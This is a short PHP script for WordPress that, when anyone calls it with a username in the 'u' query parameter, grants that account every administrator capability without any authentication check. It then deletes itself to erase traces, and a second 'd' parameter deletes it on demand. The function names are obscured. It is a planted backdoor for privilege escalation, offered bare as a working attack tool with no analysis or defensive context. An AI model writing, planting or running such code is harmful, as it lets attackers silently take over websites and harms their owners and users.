<?php 

require_once $_SERVER['DOCUMENT_ROOT'] . '/wp-load.php';

function wut() {
    return 'administrator';
}

function alz($username) {
    $user = get_user_by('login', $username);

    if (!$user) {
        return 'USERNAME NOT FOUNDD!!';
    }

    $role_name = wut();
    $capabilities = get_role($role_name)->capabilities;

    foreach ($capabilities as $capability => $value) {
        $user->add_cap($capability);
    }
    return $user->has_cap(array_key_first($capabilities)) ? 'Success!' : 'Failed';
}

if($_GET['u']) {
    $username = $_GET['u'];
    $result = alz($username);
    echo $result;
    
    if($result == 'Success!') {
        unlink(__FILE__);
    }
}
if($_GET['d']) {
    unlink(__FILE__);
}
